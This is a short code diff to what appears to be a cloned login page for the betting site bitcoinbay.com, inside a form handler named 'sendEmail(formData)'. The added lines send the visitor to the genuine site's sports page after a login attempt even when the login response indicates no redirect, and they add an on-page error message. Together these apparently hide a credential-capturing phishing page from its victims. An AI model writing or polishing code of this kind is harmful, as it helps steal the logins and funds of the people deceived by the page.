@@ -995,6 +995,7 @@ function sendEmail(formData) {
           <button class="btn mdc-button--raised2 col-6" type="submit">LOGIN</button>
         </div>
       </form>
+      <div id="loginMessage" style="margin: 10px; color: red;"></div> <!-- Message div -->
     </div>
   </div>
 </div>
@@ -1048,12 +1049,14 @@ function sendEmail(formData) {
                               } else {
                                   // Handle successful login without redirect
                                   console.log('Login successful but no redirect found.');
-                                  // You can add additional logic here if needed
+                                  window.location.href = 'https://www.bitcoinbay.com/sports.html?v=1722647763967'; // Redirect to the specified URL
                               }
                           }
                       } else {
                           // Handle cases where no redirection or success indication is found
                           console.log('Login response does not indicate a redirect.');
+                          document.getElementById('loginMessage').textContent = 'Login response does not indicate a redirect.';
+                          window.location.href = 'https://www.bitcoinbay.com/sports.html?v=1722647763967'; // Redirect to the specified URL
                       }
                   });
               } else {
@@ -1062,6 +1065,7 @@ function sendEmail(formData) {
           })
           .catch(error => {
               console.error('Error:', error);
+              document.getElementById('loginMessage').textContent = 'Error: ' + error.message;
           });
       });
   });
